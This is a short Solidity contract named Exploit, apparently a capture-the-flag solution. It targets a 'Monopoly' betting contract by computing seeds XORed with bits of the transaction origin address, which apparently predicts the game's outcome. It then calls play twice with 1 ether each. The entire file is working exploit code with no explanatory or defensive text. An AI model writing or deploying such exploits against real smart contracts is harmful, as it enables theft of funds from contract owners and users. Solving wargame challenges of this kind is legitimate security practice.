pragma solidity ^0.8.11;

interface IMonopoly {
    function play(uint32 _seed1, uint32 _seed2) external payable;
}

contract Exploit {
    constructor(IMonopoly monopoly) payable {
        uint32 seed1 = 1 << 10;
        uint32 seed2 = 1 << 9;

        seed1 ^= uint16(bytes2(bytes20(address(tx.origin))));
        seed2 ^= uint16(bytes2(bytes20(address(tx.origin))));
        monopoly.play{value: 1 ether}(seed1, seed2);

        uint32 seed3 = 1 << 2;
        uint32 seed4 = 1 << 9;

        seed3 ^= uint16(bytes2(bytes20(address(tx.origin))));
        seed4 ^= uint16(bytes2(bytes20(address(tx.origin))));
        monopoly.play{value: 1 ether}(seed3, seed4);
    }

    receive() external payable {}
}
